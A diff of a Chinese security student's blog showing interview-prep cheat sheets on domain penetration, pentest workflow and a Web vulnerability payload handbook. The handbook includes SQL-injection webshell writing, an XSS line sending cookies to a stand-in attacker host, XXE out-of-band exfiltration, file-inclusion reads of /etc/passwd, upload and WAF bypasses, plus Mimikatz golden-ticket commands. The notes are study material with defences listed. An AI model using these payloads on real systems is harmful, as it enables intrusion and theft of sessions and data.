+<tbody><tr>
+<td>Windows</td>
+<td>补丁漏洞 EXP（systeminfo 查补丁）、服务缺陷、令牌窃取</td>
+</tr>
+<tr>
+<td>Linux</td>
+<td>SUID（<code>find / -perm -4000</code>）、内核漏洞、sudo 配置不当</td>
+</tr>
+<tr>
+<td>数据库</td>
+<td>MSSQL SA + <code>xp_cmdshell</code>、MySQL UDF&#x2F;写文件</td>
+</tr>
+</tbody></table>
+<h2 id="六、域渗透"><a href="#六、域渗透" class="headerlink" title="六、域渗透"></a>六、域渗透</h2><p><span class="badge-interview">面试高频</span> 工作组 vs 域：工作组无统一管理&#x2F;统一认证；域通过 DC（AD）统一管理。</p>
+<p><strong>Kerberos 认证链</strong>：<code>AS 验身份 → TGT(黄金票据) → TGS 换票 → ST(白银票据) → 服务放行</code>。</p>
+<table>
+<thead>
+<tr>
+<th>攻击</th>
+<th>前提</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PTH</td>
+<td>密码哈希</td>
+<td>直接认证登录</td>
+</tr>
+<tr>
+<td>PTT</td>
+<td>票据文件</td>
+<td>导入票据冒充身份</td>
+</tr>
+<tr>
+<td>黄金票据</td>
+<td>krbtgt 哈希+SID</td>
+<td>伪造 TGT，通吃全域（权限维持）</td>
+</tr>
+<tr>
+<td>白银票据</td>
+<td>目标服务账号哈希+SID</td>
+<td>伪造 ST，访问单个服务</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>域内普通用户</td>
+<td>拿服务票据离线爆破</td>
+</tr>
+</tbody></table>
+<p><strong>工具</strong>：Mimikatz（<code>kerberos::golden</code> &#x2F; <code>kerberos::ptt</code>）、Impacket、BloodHound、CS + Landon 插件。</p>
+<p><span class="badge-key">★重点</span> 记忆：<strong>定位域控 → 抓凭据 → PTH&#x2F;PTT 横向 → 拿 krbtgt 伪造黄金票据 → 控制全域</strong>。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/intranet-domain/" data-id="cuid_Gc3RLKtDFTBjq_hn5sSC" data-title="内网渗透与域渗透速查" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9A%A7%E9%81%93/" rel="tag">隧道</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-security-notes-pentest-checklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/pentest-checklist/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:10:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/security-notes/pentest-checklist/">渗透测试全流程速查</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>渗透测试标准流程速查表，从授权到报告一条线。面试背流程、实战按清单走。</p>
+</blockquote>
+<h2 id="一、七步总流程"><a href="#一、七步总流程" class="headerlink" title="一、七步总流程"></a>一、七步总流程</h2><p><span class="badge-key">★重点</span> <span class="badge-interview">面试高频</span></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明确目标 → 信息收集 → 漏洞发现 → 漏洞验证 → 漏洞利用(可选) → 提权与内网(可选) → 报告与复测</span><br></pre></td></tr></table></figure>
+
+<p>企业落地三环节：<strong>漏洞探测 → 漏洞验证 → 报告输出与修复建议</strong>。</p>
+<h2 id="二、合规红线"><a href="#二、合规红线" class="headerlink" title="二、合规红线"></a>二、合规红线</h2><ul>
+<li>无授权不测试，授权书含八大要素（范围&#x2F;时限&#x2F;方法限制&#x2F;双方责任等）。</li>
+<li>常规渗透<strong>点到为止</strong>：验证即止，不拖库、不删改数据。</li>
+<li>授权攻防（护网&#x2F;红队）才做：WebShell → 提权 → 内网横向。</li>
+<li>所有操作截图留证。</li>
+</ul>
+<h2 id="三、信息收集清单（80-成败）"><a href="#三、信息收集清单（80-成败）" class="headerlink" title="三、信息收集清单（80% 成败）"></a>三、信息收集清单（80% 成败）</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>工具</th>
+<th>产出</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域名&#x2F;子域名</td>
+<td>Whois、OneForAll、JSFinder</td>
+<td>资产清单</td>
+</tr>
+<tr>
+<td>真实 IP</td>
+<td>超级 Ping、DNSDB、C 段</td>
+<td>源站 IP</td>
+</tr>
+<tr>
+<td>端口服务</td>
+<td>Nmap、Masscan</td>
+<td>端口+Banner 版本</td>
+</tr>
+<tr>
+<td>指纹</td>
+<td>Wappalyzer、EHole、WhatWeb</td>
+<td>CMS&#x2F;框架&#x2F;中间件版本</td>
+</tr>
+<tr>
+<td>目录文件</td>
+<td>Dirsearch、7kbscan</td>
+<td>后台&#x2F;备份&#x2F;.git 泄露</td>
+</tr>
+<tr>
+<td>旁站 C 段</td>
+<td>WebScan.cc、SP Scan</td>
+<td>同 IP&#x2F;同网段资产</td>
+</tr>
+<tr>
+<td>测绘</td>
+<td>FOFA、Shodan</td>
+<td>公网资产</td>
+</tr>
+</tbody></table>
+<p><strong>常用命令</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -p- 目标          <span class="comment"># 全端口+版本</span></span><br><span class="line">python dirsearch.py -u http://目标 -e php</span><br><span class="line">python oneforall.py --target 域名 run</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、漏洞发现与验证"><a href="#四、漏洞发现与验证" class="headerlink" title="四、漏洞发现与验证"></a>四、漏洞发现与验证</h2><ul>
+<li>工具漏扫（AWVS&#x2F;Xray&#x2F;Nessus）+ 手工测试结合。</li>
+<li>扫描器扫不出：逻辑漏洞、越权漏洞——必须手工。</li>
+<li><strong>验证标准</strong>：构造载荷复现、截图留证，扫描器结果默认视为误报。</li>
+</ul>
+<h2 id="五、报告要素"><a href="#五、报告要素" class="headerlink" title="五、报告要素"></a>五、报告要素</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试概述 → 资产梳理 → 漏洞清单(分级) → 漏洞复现(截图+数据包) → 修复建议 → 整体总结</span><br></pre></td></tr></table></figure>
+
+<p><span class="badge-key">★重点</span> 甲方最看重<strong>可落地的修复建议</strong>；整改后必须<strong>复测闭环</strong>（独立复测报告）。</p>
+<h2 id="六、高频考点"><a href="#六、高频考点" class="headerlink" title="六、高频考点"></a>六、高频考点</h2><ul>
+<li>黑白灰盒：黑盒无资料盲测；白盒源码审计；灰盒黑白结合（企业主流）。</li>
+<li>打点 vs 深度测试：打点拿权限，深度测试验证即止。</li>
+<li>信息收集为什么重要：版本匹配漏洞、绕过 CDN 找源站、子域找薄弱点。</li>
+<li>报告周期：一般半年一次，等保三级季度一次。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/pentest-checklist/" data-id="cuid7QxUJU6h9UtZD8MYPPvuk" data-title="渗透测试全流程速查" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A5%E5%91%8A/" rel="tag">报告</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B5%81%E7%A8%8B/" rel="tag">流程</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-security-notes-payload-handbook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/payload-handbook/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:00:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/security-notes/payload-handbook/">Web 漏洞速查与 Payload 手册</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>由渗透测试课程笔记提炼的 <strong>Web 漏洞速查手册</strong>：每个漏洞一张表，原理一句话 + 核心 Payload + 防御。面试和实战随手翻。</p>
+</blockquote>
+<p><span class="badge-key">★重点</span> 所有 Payload 仅限自有靶场&#x2F;授权测试使用。</p>
+<hr>
+<h2 id="一、SQL-注入"><a href="#一、SQL-注入" class="headerlink" title="一、SQL 注入"></a>一、SQL 注入</h2><p><span class="badge-key">★重点</span> <span class="badge-interview">面试高频</span> 原理：后端把用户输入直接拼接进 SQL 语句执行。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>核心 Payload</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>字符型</td>
+<td><code>&#39; or 1=1 #</code></td>
+<td>闭合引号，<code>#</code> 注释掉后面</td>
+</tr>
+<tr>
+<td>数字型</td>
+<td><code>and 1=1</code> &#x2F; <code>and 1=2</code></td>
+<td>无需闭合引号，逻辑配对判断</td>
+</tr>
+<tr>
+<td>搜索型</td>
+<td><code>%&#39; or 1=1 #</code></td>
+<td>闭合 LIKE 的 <code>%</code> 和引号</td>
+</tr>
+<tr>
+<td>联合查询</td>
+<td><code>-1&#39; union select 1,2,3 #</code></td>
+<td><code>order by</code> 测列数，回显位换查询</td>
+</tr>
+<tr>
+<td>报错注入</td>
+<td><code>and updatexml(1,concat(0x7e,database(),0x7e),1)</code></td>
+<td>无回显有报错时首选，单次 32 字符</td>
+</tr>
+<tr>
+<td>布尔盲注</td>
+<td><code>and length(database())&gt;3</code></td>
+<td>页面正常&#x2F;异常判断</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td><code>and sleep(5)</code></td>
+<td>响应延迟判断</td>
+</tr>
+<tr>
+<td>写 Shell</td>
+<td><code>union select 1,&#39;&lt;?php @eval($_POST[x]);?&gt;&#39; into outfile &#39;路径&#39;</code></td>
+<td>需 secure_file_priv 开放+绝对路径+写权限</td>
+</tr>
+</tbody></table>
+<p><strong>脱库固定流程</strong>：<code>version()</code> &#x2F; <code>user()</code> &#x2F; <code>database()</code> → <code>information_schema.tables</code> 爆表 → <code>columns</code> 爆字段 → <code>limit</code> 逐行取数据。</p>
+<p><strong>工具</strong>：<code>sqlmap -u &quot;目标?id=1&quot; --dbs</code>，带登录态用 <code>-r 请求文件</code>，过 WAF 用 <code>--tamper</code>。</p>
+<p><strong>防御</strong>：参数化查询（预编译）是唯一根治方案；最小权限、屏蔽报错、WAF 兜底。</p>
+<hr>
+<h2 id="二、XSS-跨站脚本"><a href="#二、XSS-跨站脚本" class="headerlink" title="二、XSS 跨站脚本"></a>二、XSS 跨站脚本</h2><p><span class="badge-interview">面试高频</span> 三类：存储型（入库持久&#x2F;高危）、反射型（URL 一次性）、DOM 型（前端动态渲染）。</p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>文本内输出</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>图片事件（自动触发）</td>
+<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>SVG（自动触发）</td>
+<td><code>&lt;svg onload=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>属性内输出</td>
+<td><code>&#39; onclick=alert(1) &gt;</code>（引号闭合+事件注入）</td>
+</tr>
+<tr>
+<td>URL 伪协议</td>
+<td><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;点我&lt;/a&gt;</code></td>
+</tr>
+<tr>
+<td>窃取 Cookie</td>
+<td><code>&lt;img src=x onerror=&quot;new Image().src=&#39;http://攻击者/log?c=&#39;+document.cookie&quot;&gt;</code></td>
+</tr>
+</tbody></table>
+<p><span class="badge-key">★重点</span> 防御：输入过滤 + <strong>输出转义</strong>双端；拿到管理员会话 &#x3D; 拿下后台。</p>
+<hr>
+<h2 id="三、文件上传与解析"><a href="#三、文件上传与解析" class="headerlink" title="三、文件上传与解析"></a>三、文件上传与解析</h2><table>
+<thead>
+<tr>
+<th>防护</th>
+<th>绕过 Payload&#x2F;手法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前端 JS 校验</td>
+<td>删 JS &#x2F; 抓包改包（<code>shell.png</code> → <code>shell.php</code>）</td>
+</tr>
+<tr>
+<td>MIME 校验</td>
+<td>抓包改 <code>Content-Type: image/jpeg</code></td>
+</tr>
+<tr>
+<td>文件头校验</td>
+<td><code>copy /b 图片.jpg + 木马.php 图片马.jpg</code></td>
+</tr>
+<tr>
+<td>后缀黑名单</td>
+<td>大小写 <code>pHp</code>、双写 <code>pphphp</code>、<code>shell.php.</code>、<code>%00</code> 截断</td>
+</tr>
+<tr>
+<td>图片马执行</td>
+<td>配合解析漏洞&#x2F;文件包含（<code>/shell.jpg/1.php</code>）</td>
+</tr>
+</tbody></table>
+<p><strong>解析漏洞速记</strong>：IIS6 分号截断 <code>shell.asp;.jpg</code>；Apache 多后缀 <code>shell.php.xxx</code>；Nginx <code>cgi.fix_pathinfo=1</code> + 图片马。</p>
+<p><strong>文件包含</strong>：路径可控直接 <code>?page=../../../../etc/passwd</code>；读源码用 <code>php://filter/read=convert.base64-encode/resource=index.php</code>。</p>
+<hr>
+<h2 id="四、命令执行-反序列化"><a href="#四、命令执行-反序列化" class="headerlink" title="四、命令执行 &#x2F; 反序列化"></a>四、命令执行 &#x2F; 反序列化</h2><p><span class="badge-interview">面试高频</span> <strong>PHP 危险函数</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令执行</td>
+<td><code>system</code> &#x2F; <code>exec</code> &#x2F; <code>shell_exec</code> &#x2F; 反引号 &#x2F; <code>popen</code></td>
+</tr>
+<tr>
+<td>代码执行</td>
+<td><code>eval</code> &#x2F; <code>assert</code> &#x2F; <code>preg_replace /e</code></td>
+</tr>
+</tbody></table>
+<p>命令连接符：<code>;</code>（无条件）、<code>&amp;&amp;</code>（成功才执行）、<code>||</code>（失败才执行）、<code>|</code>（管道）。</p>
+<p><strong>反序列化</strong>：用户可控序列化字符串被直接 <code>unserialize()</code>，触发魔术方法 <code>__construct</code> &#x2F; <code>__destruct</code> 执行代码。重点组件：WebLogic、Shiro、Fastjson、Apache Commons。</p>
+<p><strong>防御</strong>：不反序列化不可信数据；类白名单；升级组件；<code>disable_functions</code>。</p>
+<hr>
+<h2 id="五、SSRF-XXE"><a href="#五、SSRF-XXE" class="headerlink" title="五、SSRF &#x2F; XXE"></a>五、SSRF &#x2F; XXE</h2><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>核心 Payload</th>
+<th>利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSRF</td>
+<td><code>url=http://127.0.0.1:80</code>、<code>file:///etc/passwd</code>、<code>dict://ip:3306</code></td>
+<td>内网探测、读文件</td>
+</tr>
+<tr>
+<td>XXE</td>
+<td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td>
+<td>读文件、内网请求</td>
+</tr>
+<tr>
+<td>XXE 无回显</td>
+<td>实体外带到 <code>http://攻击者/?p=%file;</code></td>
+<td>日志&#x2F;DNSLog 接收</td>
+</tr>
+</tbody></table>
+<p><strong>SSRF 绕过</strong>：进制转换（<code>0xC0A80116</code>）、IP 简写（<code>10.1</code>）、<code>@</code> 解析（<code>http://白名单域名@内网IP</code>）。</p>
+<p><strong>防御</strong>：URL 白名单、协议白名单、过滤内网 IP；XXE 禁用外部实体（PHP <code>libxml_disable_entity_loader(true)</code>）。</p>
+<hr>
+<h2 id="六、越权-逻辑-爆破"><a href="#六、越权-逻辑-爆破" class="headerlink" title="六、越权 &#x2F; 逻辑 &#x2F; 爆破"></a>六、越权 &#x2F; 逻辑 &#x2F; 爆破</h2><p><span class="badge-key">★重点</span> <strong>越权三兄弟</strong>：未授权访问（不登录直访）、水平越权（改 ID 看别人数据）、垂直越权（换身份执行管理员操作）。</p>
+<p>测试法：两个账号抓包 → 找到身份标识（Cookie&#x2F;UID&#x2F;SID）→ 替换 → 放包看结果。</p>
+<p><strong>逻辑漏洞</strong>：支付改价、状态参数篡改（<code>F=0</code>→<code>1</code>）、积分篡改、验证码爆破、短信轰炸——扫描器扫不出，只能手工。</p>
+<p><strong>爆破</strong>：<code>hydra -L users.txt -P pass.txt ssh://目标</code>；Web 表单用 Burp Intruder；验证码前端删 JS、后端吃时效；Token 从响应中递归提取。</p>
+<hr>
+<h2 id="七、WAF-绕过"><a href="#七、WAF-绕过" class="headerlink" title="七、WAF 绕过"></a>七、WAF 绕过</h2><p><span class="badge-interview">面试高频</span> 识别（wafw00f）→ 绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>              <span class="comment">-- 大小写</span></span><br><span class="line"><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>           <span class="comment">-- 注释</span></span><br><span class="line"><span class="comment">/*!50000and*/</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>    <span class="comment">-- 内联注释</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span>         <span class="comment">-- 等价替换</span></span><br><span class="line"><span class="keyword">and</span><span class="operator">%</span><span class="number">0</span>a1<span class="operator">=</span><span class="number">1</span>            <span class="comment">-- 编码空格</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">0x31</span><span class="operator">=</span><span class="number">0x31</span>        <span class="comment">-- 十六进制</span></span><br></pre></td></tr></table></figure>
+
+<p>组合技：URL 编码 + 双重编码 + 分块传输（Chunked）+ 换请求位置（GET→POST→Cookie）。</p>
+<hr>
+<p><span class="badge-key">★重点</span> <strong>一句话记忆</strong>：有回显联合查，有报错 updatexml，无回显上盲注；上传图片马配解析&#x2F;包含；WAF 规则匹配不到&#x3D;放行。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/payload-handbook/" data-id="cuidYZZXW_n7TgWPqT3loStEW" data-title="Web 漏洞速查与 Payload 手册" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%8A%E4%BC%A0/" rel="tag">上传</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-welcome" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/06/25/welcome/" class="article-date">
@@ -107,17 +861,45 @@
       
         <div class="home-welcome">
   <h2>CX-5W 的安全笔记</h2>
-  <p>吉林师范大学 · 网络空间安全 · 大二<br>CTF 解题记录 · 安全技术沉淀 · 编码密码速查</p>
+  <p class="hero-sub">Web Security · CTF · 渗透测试</p>
+  <p>吉林师范大学 · 网络空间安全 · 大二<br>CTF 解题记录 · 安全技术沉淀 · 渗透测试体系笔记</p>
+  <div class="hero-actions">
+    <a class="hero-btn primary" href="/resume/">在线简历</a>
+    <a class="hero-btn ghost" href="/security-notes/payload-handbook/">Payload 手册</a>
+    <a class="hero-btn ghost" href="/security-notes/">安全笔记</a>
+    <a class="hero-btn ghost" target="_blank" rel="noopener" href="https://github.com/CX-5W">GitHub</a>
+  </div>
   <div class="quick-links">
-    <a href="/ctf-web/">Web 安全</a>
-    <a href="/ctf-Crypto/">密码学</a>
-    <a href="/编码解码学习/">编码速查</a>
-    <a href="/学习记录/">全部归档</a>
+    <a href="/security-notes/payload-handbook/">Web 漏洞 Payload</a>
+    <a href="/security-notes/interview-100/">面试高频 100 题</a>
+    <a href="/security-notes/pentest-checklist/">渗透测试速查</a>
+    <a href="/security-notes/intranet-domain/">内网与域渗透</a>
+    <a href="/security-notes/incident-response/">应急响应</a>
+    <a href="/ctf-web/">CTF 题解</a>
     <a href="/about/">关于我</a>
   </div>
 </div>
 
-<h2 id="CTF-题解"><a href="#CTF-题解" class="headerlink" title="CTF 题解"></a>CTF 题解</h2><table>
+<h2 id="📌-本站亮点"><a href="#📌-本站亮点" class="headerlink" title="📌 本站亮点"></a>📌 本站亮点</h2><div class="highlight-grid">
+  <div class="highlight-card">
+    <h3><a href="/security-notes/payload-handbook/">Web 漏洞 Payload 手册</a></h3>
+    <p>SQL 注入 / XSS / 上传 / 命令执行 / SSRF/XXE / WAF 绕过，每个漏洞一张速查表</p>
+  </div>
+  <div class="highlight-card">
+    <h3><a href="/security-notes/interview-100/">面试高频 100 题</a></h3>
+    <p>协议 / Web 漏洞 / 内网域 / 应急 / 开发全覆盖，求职突击必备</p>
+  </div>
+  <div class="highlight-card">
+    <h3><a href="/security-notes/pentest-checklist/">渗透测试全流程</a></h3>
+    <p>七步流程 + 信息收集清单 + 报告要素，一条线讲清渗透测试</p>
+  </div>
+  <div class="highlight-card">
+    <h3><a href="/security-notes/intranet-domain/">内网与域渗透</a></h3>
+    <p>代理隧道 / 横向移动 / 提权 / 黄金白银票据速查</p>
+  </div>
+</div>
+
+<h2 id="🏁-CTF-题解"><a href="#🏁-CTF-题解" class="headerlink" title="🏁 CTF 题解"></a>🏁 CTF 题解</h2><table>
 <thead>
 <tr>
 <th>分类</th>
@@ -149,12 +931,13 @@
 <td>Reverse 逆向分析</td>
 </tr>
 </tbody></table>
-<h2 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h2><ul>
-<li><a href="/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E5%AD%A6%E4%B9%A0/">编码解码学习</a> — 涵盖 ASCII、Hex、Base 家族、古典密码、XOR、UUencode、维吉尼亚等，附带 Python 代码和识别特征速查表</li>
+<h2 id="📚-学习笔记"><a href="#📚-学习笔记" class="headerlink" title="📚 学习笔记"></a>📚 学习笔记</h2><ul>
+<li><a href="/security-notes/">安全笔记</a> — 渗透测试课程体系笔记（45 篇 &#x2F; 8 大主题）核心速查</li>
+<li><a href="/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E5%AD%A6%E4%B9%A0/">编码解码学习</a> — ASCII、Hex、Base 家族、古典密码、XOR 等，附 Python 代码</li>
 <li><a href="/%E7%BB%88%E7%AB%AF%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/">终端命令汇总</a> — 常用命令行速查</li>
 <li><a href="/%E5%AD%A6%E4%B9%A0Markdown%E8%AF%AD%E6%B3%95/">学习 Markdown 语法</a> — Markdown 快速入门</li>
 </ul>
-<h2 id="个人项目"><a href="#个人项目" class="headerlink" title="个人项目"></a>个人项目</h2><table>
+<h2 id="👤-个人项目"><a href="#👤-个人项目" class="headerlink" title="👤 个人项目"></a>👤 个人项目</h2><table>
 <thead>
 <tr>
 <th>项目</th>
@@ -178,7 +961,7 @@
 <td>CTF-Writeups 和 Security-Scripts 仓库介绍</td>
 </tr>
 </tbody></table>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ul>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
 <li><strong>GitHub</strong>: <a target="_blank" rel="noopener" href="https://github.com/CX-5W">github.com&#x2F;CX-5W</a> — CTF 题解归档 + 安全脚本</li>
 <li><strong>博客</strong>: <a href="https://cx-5w.github.io/">cx-5w.github.io</a></li>
 </ul>
@@ -205,15 +988,29 @@
           <aside id="sidebar">
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">上传</a> <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 10px;">代理</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a> <a href="/tags/%E5%BA%94%E6%80%A5/" style="font-size: 10px;">应急</a> <a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 10px;">护网</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">报告</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E6%9F%A5%E6%9D%80/" style="font-size: 10px;">查杀</a> <a href="/tags/%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">流程</a> <a href="/tags/%E7%AD%89%E4%BF%9D/" style="font-size: 10px;">等保</a> <a href="/tags/%E9%9A%A7%E9%81%93/" style="font-size: 10px;">隧道</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">面试</a> <a href="/tags/%E9%A2%98%E5%BA%93/" style="font-size: 10px;">题库</a> <a href="/tags/%E9%AB%98%E9%A2%91/" style="font-size: 10px;">高频</a>
+    </div>
+  </div>
+
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a><span class="category-list-count">1</span></li></ul></li></ul>
+    </div>
+  </div>
+
 
   
     
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">六月 2026</a><span class="archive-list-count">1</span></li></ul>
